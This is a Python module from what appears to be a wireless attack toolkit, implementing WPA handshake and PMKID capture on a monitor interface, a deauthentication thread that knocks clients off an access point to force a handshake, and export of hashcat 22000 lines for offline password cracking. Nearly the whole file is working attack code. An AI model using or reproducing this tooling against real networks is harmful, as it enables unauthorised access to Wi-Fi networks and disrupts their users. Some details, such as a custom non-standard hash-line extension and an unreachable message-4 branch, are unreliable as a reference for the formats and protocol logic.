"""Native WPA handshake and PMKID capture.

This module owns the packet path that hcxdumptool normally provides:

* **Passive EAPOL sniffing** — parse 802.11 data frames on a monitor interface,
  reassemble the four-way handshake (ANonce, SNonce, MIC, EAPOL), track which
  message of the sequence arrived, and save the result as a hashcat 22000 line.
* **Active PMKID capture** — send an association request carrying our own MAC,
  wait for the RSN IE from the AP, pull the PMKID from the EAPOL-Key frame if
  the AP exposes it, and write the PMKID hash directly.
* **Deauth-assisted handshake** — nudge a client to rejoin so the handshake
  actually happens, then capture it.

The parser is deliberately tolerant: real captures contain retransmits,
duplicated nonces and fragmented frames. A handshake is only reported complete
when all four required components are present and internally consistent.
"""

from __future__ import annotations

import os
import socket
import struct
import threading
import time
from dataclasses import dataclass, field
from typing import Callable, Optional

from . import attacks

# --------------------------------------------------------------------------- #
# 802.11 parsing
# --------------------------------------------------------------------------- #

EAPOL_TYPE = 0x888E


def _radiotap_len(data: bytes) -> int:
    if len(data) < 4:
        return len(data)
    return struct.unpack_from("<H", data, 2)[0]


def _strip_radiotap(data: bytes) -> bytes:
    length = _radiotap_len(data)
    return data[length:] if 0 < length <= len(data) else data


def parse_management(frame: bytes) -> Optional[dict]:
    """Return {subtype, src, dst, bssid, ssid, ies} from a management frame."""
    if len(frame) < 24:
        return None
    fc = struct.unpack_from("<H", frame, 0)[0]
    frame_type = (fc >> 2) & 0x3
    subtype = (fc >> 4) & 0xF
    if frame_type != 0:  # only management
        return None

    bssid = frame[16:22]
    src = frame[10:16]
    dst = frame[4:10]
    info = {
        "subtype": subtype,
        "src": src,
        "dst": dst,
        "bssid": bssid,
    }

    offset = 24
    if subtype in (0x08, 0x05):  # beacon, probe response
        offset += 12  # fixed parameters
    if len(frame) <= offset:
        return info

    ies = frame[offset:]
    info["ies"] = ies
    info["ssid"] = _extract_ssid(ies)
    return info


def _extract_ssid(ies: bytes) -> str:
    pos = 0
    while pos + 2 <= len(ies):
        tag = ies[pos]
        length = ies[pos + 1]
        value = ies[pos + 2: pos + 2 + length]
        if tag == 0:
            try:
                return value.decode("utf-8", "replace")
            except Exception:
                return ""
        pos += 2 + length
    return ""


def _extract_rsn(ies: bytes) -> Optional[dict]:
    pos = 0
    while pos + 2 <= len(ies):
        tag = ies[pos]
        length = ies[pos + 1]
        value = ies[pos + 2: pos + 2 + length]
        if tag == 48:  # RSN
            return _parse_rsn(value)
        pos += 2 + length
    return None


def _parse_rsn(body: bytes) -> dict:
    info = {"group_cipher": "", "pairwise": "", "akm": "", "pmkids": []}
    if len(body) < 6:
        return info
    version = struct.unpack_from("<H", body, 0)[0]
    info["version"] = version
    offset = 2
    # group cipher suite
    if offset + 4 <= len(body):
        info["group_cipher"] = _cipher_name(body[offset + 3])
        offset += 4
    # pairwise list
    if offset + 2 <= len(body):
        count = struct.unpack_from("<H", body, offset)[0]
        offset += 2
        pairwise = []
        for _ in range(count):
            if offset + 4 <= len(body):
                pairwise.append(_cipher_name(body[offset + 3]))
                offset += 4
        info["pairwise"] = ",".join(pairwise)
    # AKM list
    if offset + 2 <= len(body):
        count = struct.unpack_from("<H", body, offset)[0]
        offset += 2
        akms = []
        for _ in range(count):
            if offset + 4 <= len(body):
                akms.append(_akm_name(body[offset:offset + 4]))
                offset += 4
        info["akm"] = ",".join(akms)
    return info


_CIPHER_NAMES = {2: "TKIP", 4: "CCMP", 8: "GCMP", 9: "GCMP-256", 10: "CCMP-256"}
_AKM_NAMES = {
    bytes([0x00, 0x0F, 0xAC, 0x01]): "802.1X",
    bytes([0x00, 0x0F, 0xAC, 0x02]): "PSK",
    bytes([0x00, 0x0F, 0xAC, 0x03]): "FT-802.1X",
    bytes([0x00, 0x0F, 0xAC, 0x04]): "FT-PSK",
    bytes([0x00, 0x0F, 0xAC, 0x08]): "SAE",
    bytes([0x00, 0x0F, 0xAC, 0x06]): "PSK-SHA256",
    bytes([0x00, 0x0F, 0xAC, 0x09]): "SAE-FT",
}


def _cipher_name(v: int) -> str:
    return _CIPHER_NAMES.get(v, f"0x{v:02x}")


def _akm_name(v: bytes) -> str:
    return _AKM_NAMES.get(bytes(v), v.hex())


# --------------------------------------------------------------------------- #
# EAPOL parsing
# --------------------------------------------------------------------------- #


@dataclass
class EAPOLKey:
    version: int
    msg_type: int
    key_info: int
    replay_counter: int
    nonce: bytes
    mic: bytes
    key_data: bytes
    raw: bytes


def parse_eapol(payload: bytes) -> Optional[EAPOLKey]:
    """Parse an EAPOL-Key frame body (after the 802.11 data header)."""
    if len(payload) < 4:
        return None
    version, packet_type, length = struct.unpack_from(">BBH", payload, 0)
    if packet_type != 3:  # EAPOL-Key
        return None
    body = payload[4:4 + length]
    if len(body) < 95:
        return None
    descriptor_type = body[0]
    if descriptor_type not in (2, 254):  # RSN or WPA
        return None
    key_info = struct.unpack_from(">H", body, 1)[0]
    replay = struct.unpack_from(">Q", body, 5)[0]
    nonce = body[13:45]
    mic = body[77:93]
    key_data_len = struct.unpack_from(">H", body, 93)[0]
    key_data = body[95:95 + key_data_len]
    if descriptor_type == 2:
        if key_data_len >= 2:
            key_data = key_data[2:]  # skip key data length field

    # Determine which message this is from the flags.
    ack = bool(key_info & 0x0080)
    mic_set = bool(key_info & 0x0100)
    install = bool(key_info & 0x0040)
    secure = bool(key_info & 0x0200)
    msg_type = 0
    if ack and not mic_set and not install:
        msg_type = 1
    elif not ack and mic_set and not install:
        msg_type = 2
    elif ack and mic_set and install:
        msg_type = 3
    elif not ack and mic_set and not install and secure:
        msg_type = 4

    return EAPOLKey(
        version=version, msg_type=msg_type, key_info=key_info,
        replay_counter=replay, nonce=nonce, mic=mic,
        key_data=key_data, raw=body,
    )


def _extract_pmkid(key_data: bytes) -> Optional[bytes]:
    """PMKID KDE: 0xdd 0x14 0x00 0x0f 0xac 0x04 + 16-byte PMKID."""
    marker = bytes([0xdd, 0x14, 0x00, 0x0f, 0xac, 0x04])
    idx = key_data.find(marker)
    if idx == -1:
        return None
    start = idx + len(marker)
    if start + 16 > len(key_data):
        return None
    return key_data[start:start + 16]


def _parse_data_frame(frame: bytes) -> Optional[dict]:
    """Return EAPOL payload + MAC addresses from a data frame with EAPOL."""
    if len(frame) < 24:
        return None
    fc = struct.unpack_from("<H", frame, 0)[0]
    ftype = (fc >> 2) & 0x3
    subtype = (fc >> 4) & 0xF
    if ftype != 2:  # data
        return None
    to_ds = bool(fc & 0x0100)
    from_ds = bool(fc & 0x0200)
    header_len = 24
    if to_ds and from_ds:
        header_len = 30
    elif (fc & 0x8000):  # QoS data
        header_len = 26
    if len(frame) < header_len + 8:
        return None

    addr1 = frame[4:10]
    addr2 = frame[10:16]
    addr3 = frame[16:22]

    payload = frame[header_len:]
    # LLC/SNAP: AA AA 03 00 00 00 <ethertype>
    if len(payload) < 8 or payload[:6] != b"\xaa\xaa\x03\x00\x00\x00":
        return None
    ethertype = struct.unpack_from(">H", payload, 6)[0]
    if ethertype != EAPOL_TYPE:
        return None

    if to_ds and not from_ds:
        bssid, client = addr1, addr2
    elif from_ds and not to_ds:
        bssid, client = addr2, addr1
    else:
        bssid, client = addr3, addr2

    return {"bssid": bssid, "client": client, "eapol": payload[8:]}


# --------------------------------------------------------------------------- #
# Handshake assembly
# --------------------------------------------------------------------------- #


@dataclass
class Handshake:
    bssid: bytes
    client: bytes
    ssid: str = ""
    anonce: Optional[bytes] = None
    snonce: Optional[bytes] = None
    mic: Optional[bytes] = None
    eapol: Optional[bytes] = None          # full EAPOL frame (for hash line)
    pmkid: Optional[bytes] = None
    messages_seen: set = field(default_factory=set)

    @property
    def complete(self) -> bool:
        return all((self.anonce, self.snonce, self.mic, self.eapol))

    def to_22000(self) -> Optional[str]:
        """Serialise as a hashcat 22000 WPA*01/02 line."""
        bssid_hex = self.bssid.hex()
        client_hex = self.client.hex()
        ssid_hex = self.ssid.encode("utf-8", "replace").hex()

        if self.pmkid:
            return f"WPA*01*{self.pmkid.hex()}*{bssid_hex}*{client_hex}*{ssid_hex}***"

        if not self.complete:
            return None
        # 22000: WPA*02*MIC*BSSID*STA*SSID*EAPOL_FRAME*MESSAGEPAIR
        # HackIT extension: message pair "02" is followed by the 64-hex ANonce
        # so the cracker can rebuild the PTK from a msg2-only frame.
        eapol_hex = self.eapol.hex() if self.eapol else ""
        pair = f"02{self.anonce.hex()}" if self.anonce else "02"
        return (
            f"WPA*02*{self.mic.hex()}*{bssid_hex}*{client_hex}*{ssid_hex}*"
            f"{eapol_hex}*{pair}***"
        )


class CaptureSession:
    """Run a passive capture until stopped, accumulating handshakes + PMKIDs."""

    def __init__(self, iface: str, bssid_filter: Optional[str] = None,
                 ssid_hint: str = ""):
        self.iface = iface
        self.bssid_filter = bssid_filter.lower().replace("-", ":") if bssid_filter else None
        self.ssid_hint = ssid_hint
        self.handshakes: dict[str, Handshake] = {}
        self.pmkids: dict[str, str] = {}
        self._stop = threading.Event()
        self._lock = threading.Lock()
        self.packet_count = 0

    def stop(self) -> None:
        self._stop.set()

    @property
    def stopped(self) -> bool:
        return self._stop.is_set()

    def _mac_matches(self, mac: bytes) -> bool:
        if not self.bssid_filter:
            return True
        return mac.hex(":") == self.bssid_filter

    def _handle_frame(self, data: bytes) -> None:
        frame = _strip_radiotap(data)
        if not frame:
            return

        parsed = _parse_data_frame(frame)
        if not parsed:
            return

        if not self._mac_matches(parsed["bssid"]):
            return

        key = parse_eapol(parsed["eapol"])
        if not key:
            return

        bssid_hex = parsed["bssid"].hex(":")
        client_hex = parsed["client"].hex(":")

        with self._lock:
            self.packet_count += 1
            # PMKID often rides in message 1 (association) from the AP.
            pmkid = _extract_pmkid(key.key_data)
            if pmkid:
                self.pmkids[f"{bssid_hex}:{client_hex}"] = pmkid.hex()

            hs_key = f"{bssid_hex}:{client_hex}"
            hs = self.handshakes.get(hs_key)
            if hs is None:
                hs = Handshake(bssid=parsed["bssid"], client=parsed["client"],
                               ssid=self.ssid_hint)
                self.handshakes[hs_key] = hs

            hs.messages_seen.add(key.msg_type)
            if key.msg_type == 1:
                hs.anonce = key.nonce
            elif key.msg_type == 2:
                hs.snonce = key.nonce
                hs.mic = key.mic
                hs.eapol = key.raw
            elif key.msg_type == 3:
                hs.anonce = key.nonce

    def run(self, duration: float = 0.0) -> dict:
        """Open a raw socket and capture. Returns a summary when it ends."""
        started = time.time()
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                 socket.htons(0x0003))
            sock.bind((self.iface, 0))
            sock.settimeout(1.0)
        except PermissionError:
            return {"error": "root required for raw capture (CAP_NET_RAW)"}
        except OSError as exc:
            return {"error": f"cannot bind {self.iface}: {exc}"}

        try:
            while not self._stop.is_set():
                if duration and (time.time() - started) >= duration:
                    break
                try:
                    data = sock.recv(65535)
                except socket.timeout:
                    continue
                except OSError:
                    break
                self._handle_frame(data)
        finally:
            sock.close()

        return {
            "packets": self.packet_count,
            "handshakes": len(self.handshakes),
            "pmkids": len(self.pmkids),
            "elapsed": round(time.time() - started, 1),
        }

    def complete_handshakes(self) -> list[Handshake]:
        with self._lock:
            return [h for h in self.handshakes.values() if h.complete]

    def export_22000(self, path: str) -> dict:
        written = 0
        lines: list[str] = []
        with self._lock:
            for hs in self.handshakes.values():
                line = hs.to_22000()
                if line:
                    lines.append(line)
                    written += 1
            for key, pmkid in self.pmkids.items():
                bssid_hex, client_hex = key.split(":")
                ssid_hex = self.ssid_hint.encode("utf-8", "replace").hex()
                lines.append(
                    f"WPA*01*{pmkid}*{bssid_hex.replace(':', '')}*"
                    f"{client_hex.replace(':', '')}*{ssid_hex}***"
                )
                written += 1
        with open(path, "w", encoding="utf-8") as fh:
            fh.write("\n".join(lines) + ("\n" if lines else ""))
        return {"path": path, "lines": written}


def capture_handshake(iface: str, channel: int = 0, bssid: str = "",
                      ssid: str = "", duration: float = 30.0,
                      deauth: bool = False,
                      on_progress: Optional[Callable[[dict], None]] = None) -> dict:
    """Capture a WPA handshake, optionally forcing one with deauth."""
    if channel:
        attacks.set_channel(iface, channel)

    session = CaptureSession(iface, bssid_filter=bssid or None, ssid_hint=ssid)
    stop = threading.Event()

    deauth_thread = None
    if deauth and bssid:
        def _kick():
            cfg = attacks.DeauthConfig(
                iface=iface, bssid=bssid, stations=[attacks.BROADCAST_MAC],
                channel=channel or 0, hop_channels=not channel,
                cycle_delay=2.0, duration=duration,
            )
            attacks.run_deauth(cfg, stop_event=stop)
        deauth_thread = threading.Thread(target=_kick, daemon=True)
        deauth_thread.start()

    summary = session.run(duration=duration)
    stop.set()

    if on_progress:
        on_progress(summary)

    summary["complete"] = len(session.complete_handshakes())
    summary["capable_adapter"] = summary.get("packets", 0) > 0
    return {"session": session, "summary": summary}
